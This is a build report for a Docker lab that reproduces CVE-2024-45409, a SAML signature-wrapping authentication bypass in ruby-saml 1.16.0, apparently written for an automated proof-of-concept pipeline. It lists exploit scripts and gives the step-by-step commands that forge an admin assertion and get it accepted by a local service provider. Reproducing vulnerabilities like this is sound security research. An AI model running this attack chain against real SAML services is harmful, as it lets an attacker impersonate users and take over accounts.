# Lab Build Report: CVE-2024-45409

## Lab Architecture

**Single-container lab** hosting a minimal SAML Service Provider (SP) built with ruby-saml v1.16.0, plus embedded tools for generating legitimate SAML responses and running the exploit.

```
┌───────────────────────────────────────────────────────┐
│  cve-2024-45409-vulnerable (Ruby 3.1 + Sinatra)      │
│                                                        │
│  Services:                                             │
│  ├─ Sinatra SP (port 4567)                            │
│  │   └─ ruby-saml v1.16.0 (VULNERABLE)               │
│  │                                                     │
│  Tools:                                                │
│  ├─ mock_idp.rb    (generate signed SAML responses)   │
│  ├─ ruby_exploit.rb (CVE-2024-45409 XSW exploit)      │
│  ├─ exploit.py      (Synacktiv Python PoC)            │
│  └─ certs/          (IdP signing certificate + key)   │
└───────────────────────────────────────────────────────┘
```

### Why Single Container

The SAML SP is a standalone Ruby web application with no database or external service dependencies. The mock IdP is a CLI script (not a running service) that generates signed SAML responses on demand. No multi-container orchestration is needed.

## Container Details

### cve-2024-45409-vulnerable

| Property | Value |
|----------|-------|
| **Image** | `cve-2024-45409-vulnerable` (built from `Dockerfile.vulnerable`) |
| **Base** | `ruby:3.1-slim-bookworm` |
| **Container Name** | `cve-2024-45409-vulnerable` |
| **Port** | 4567 (Sinatra SP) |
| **Networks** | `lab-net` |
| **Health Check** | `curl -f http://localhost:4567/health` (5s interval) |

#### Installed Software
- Ruby 3.1 + Bundler
- ruby-saml v1.16.0 (vulnerable)
- Sinatra v3.1.0 + WEBrick v1.8.1
- Nokogiri (XML processing)
- Python 3 + lxml (in venv at `/opt/venv`)

#### Key Files Inside Container
| File | Purpose |
|------|---------|
| `/app/sp_app.rb` | Sinatra SAML SP application |
| `/app/mock_idp.rb` | Mock IdP - generates legitimately signed SAML responses |
| `/app/ruby_exploit.rb` | Ruby-based CVE-2024-45409 exploit (recommended) |
| `/app/exploit.py` | Python-based Synacktiv exploit |
| `/app/certs/ruby-saml.crt` | IdP X.509 certificate (RSA 1024-bit, self-signed) |
| `/app/certs/ruby-saml.key` | IdP RSA private key |

#### SP Endpoints
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | SP status page with HTML form for testing |
| `/health` | GET | JSON health check |
| `/saml/acs` | POST | ACS endpoint (accepts base64-encoded `SAMLResponse` form param) |
| `/saml/acs_raw` | POST | ACS endpoint (accepts raw XML body) |

#### SP Configuration
- **IdP Certificate Fingerprint (SHA1):** `4b:68:c4:53:c7:d9:94:aa:d9:02:5c:99:d5:ef:cf:56:62:87:fe:8d`
- **Issuer:** `http://sp.example.com`
- **ACS URL:** `http://localhost:4567/saml/acs`
- **Relaxed Validations (for lab):** Skip recipient, destination, audience, subject confirmation checks; 10-year clock drift tolerance

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| Dockerfile.vulnerable | ✅ Built successfully | Ruby 3.1 + all gems installed |
| docker-compose.yml | ✅ Working | Single service + health check |
| SP Application | ✅ Running | Accepts SAML responses, returns JSON |
| Mock IdP | ✅ Working | Generates RSA-SHA1 signed responses with Exclusive C14N |
| Ruby Exploit | ✅ Working | Authentication bypass confirmed |
| Python Exploit | ⚠️ C14N mismatch | lxml produces different canonical form than Nokogiri — use `ruby_exploit.rb` instead |

### Workarounds Applied
1. **Ruby exploit instead of Python:** The Synacktiv Python exploit (`exploit.py`) uses lxml for XML canonicalization, which produces slightly different output than Ruby's Nokogiri. This causes a digest mismatch during ruby-saml verification. The Ruby exploit (`ruby_exploit.rb`) uses Nokogiri directly, ensuring identical canonicalization. **Use `ruby_exploit.rb` for the PoC.**
2. **SP validation relaxations:** The SP skips recipient, destination, audience, and subject confirmation checks to simplify testing. The core vulnerability (signature wrapping) is fully demonstrated regardless.

## Start/Stop Commands

```bash
# Start the lab
cd CVE-2024-45409
docker compose up -d

# Stop the lab
docker compose down

# Rebuild (after changes)
docker compose build --no-cache

# View logs
docker compose logs -f
```

## Verification

### Evidence: Legitimate Authentication

```bash
# Generate signed SAML response as user@example.com
docker exec cve-2024-45409-vulnerable ruby /app/mock_idp.rb user@example.com /app/legitimate_response.xml

# Submit to SP
curl -s -X POST "http://localhost:4567/saml/acs_raw" -H "Content-Type: application/xml" \
  --data-binary @<(docker exec cve-2024-45409-vulnerable cat /app/legitimate_response.xml)
```

**Result:**
```json
{
  "status": "authenticated",
  "name_id": "user@example.com",
  "message": "SAML authentication successful for: user@example.com"
}
```

### Evidence: Exploit — Authentication Bypass as admin

```bash
# Forge response as admin@example.com
docker exec cve-2024-45409-vulnerable ruby /app/ruby_exploit.rb /app/legitimate_response.xml admin@example.com /app/forged_response.xml

# Submit forged response to SP
curl -s -X POST "http://localhost:4567/saml/acs_raw" -H "Content-Type: application/xml" \
  --data-binary @<(docker exec cve-2024-45409-vulnerable cat /app/forged_response.xml)
```

**Result:**
```json
{
  "status": "authenticated",
  "name_id": "admin@example.com",
  "message": "SAML authentication successful for: admin@example.com"
}
```

The vulnerable SP authenticates the attacker as `admin@example.com` despite the SAML Response being forged from a legitimate response originally issued to `user@example.com`.

## PoC Reproduction Steps (for PoC Agent)

### Full Attack Chain

```bash
# 1. Generate legitimate SAML response (simulates capturing a valid SSO response)
docker exec cve-2024-45409-vulnerable ruby /app/mock_idp.rb user@example.com /app/legitimate_response.xml

# 2. Verify legitimate response works
curl -s -X POST "http://localhost:4567/saml/acs_raw" -H "Content-Type: application/xml" \
  --data-binary @<(docker exec cve-2024-45409-vulnerable cat /app/legitimate_response.xml)
# Expected: {"status":"authenticated","name_id":"user@example.com",...}

# 3. Run CVE-2024-45409 exploit to forge response as admin
docker exec cve-2024-45409-vulnerable ruby /app/ruby_exploit.rb \
  /app/legitimate_response.xml admin@example.com /app/forged_response.xml

# 4. Submit forged response — authentication bypass!
curl -s -X POST "http://localhost:4567/saml/acs_raw" -H "Content-Type: application/xml" \
  --data-binary @<(docker exec cve-2024-45409-vulnerable cat /app/forged_response.xml)
# Expected: {"status":"authenticated","name_id":"admin@example.com",...}
```

### Alternative: Base64-encoded submission (standard SAML flow)

```bash
# Generate base64-encoded SAMLResponse for standard ACS endpoint
B64_RESPONSE=$(docker exec cve-2024-45409-vulnerable cat /app/forged_response.xml | base64 -w0)
curl -s -X POST "http://localhost:4567/saml/acs" \
  -d "SAMLResponse=${B64_RESPONSE}" | jq .
```

## Known Issues

1. **Python exploit (exploit.py) canonicalization mismatch:** Python's lxml library produces different exclusive C14N output than Ruby's Nokogiri for the modified assertion. The digest values don't match, causing ruby-saml to reject the forged response. **Mitigation:** Use `ruby_exploit.rb` instead, which uses Nokogiri for canonicalization.

2. **Test certificate is expired (2014-2015):** The IdP certificate `ruby-saml.crt` expired in 2015. ruby-saml does not check certificate validity dates during signature verification, so this doesn't affect the lab. The certificate is from the ruby-saml project's own test suite.

3. **RSA 1024-bit key:** The test certificate uses a 1024-bit RSA key (considered weak). This is the key from ruby-saml's test suite and is sufficient for demonstrating the vulnerability.

## Lab File Listing

```
CVE-2024-45409/
├── Dockerfile.vulnerable      # Container build (ruby:3.1-slim + ruby-saml 1.16.0 + Sinatra)
├── docker-compose.yml         # Orchestration with health check and networking
├── sp_app.rb                  # Sinatra SAML Service Provider application
├── mock_idp.rb                # Mock IdP (generates signed SAML responses)
├── ruby_exploit.rb            # CVE-2024-45409 exploit (Ruby/Nokogiri - RECOMMENDED)
├── exploit.py                 # CVE-2024-45409 exploit (Python/lxml - Synacktiv)
├── poc/                       # Python PoC exploit scripts
│   ├── poc.py                 # Primary exploit — full attack chain
│   ├── poc_vector2_multi_user.py  # Multi-user impersonation
│   └── poc_vector3_response_sig.py # Response-level signature attack
└── certs/
    ├── ruby-saml.crt          # IdP X.509 certificate
    └── ruby-saml.key          # IdP RSA private key
```
